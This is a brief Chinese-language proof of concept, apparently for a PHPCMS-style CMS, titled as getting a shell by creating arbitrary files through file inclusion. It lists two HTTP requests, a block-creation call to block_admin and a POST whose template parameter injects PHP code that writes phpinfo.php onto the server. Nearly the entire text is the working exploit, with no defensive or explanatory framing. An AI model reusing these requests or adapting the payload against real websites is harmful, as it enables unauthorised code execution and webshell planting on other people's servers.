

> 利用文件包含创建任意文件getshell


## 利用过程
1. 创建表
```http request
http://www.test.com/index.php?m=block&c=block_admin&pc_hash=123456&a=add&pos=1

post 数据
dosubmit=1&name=test&type=2
```

2. 写入phpinfo
```http request
http://www.test.com/index.php?m=block&c=block_admin&a=public_view&id=4

post 数据
template=<?php file_put_contents("phpinfo.php","<?php phpinfo();?>");
```
![phpinfo](images/phpinfo.png)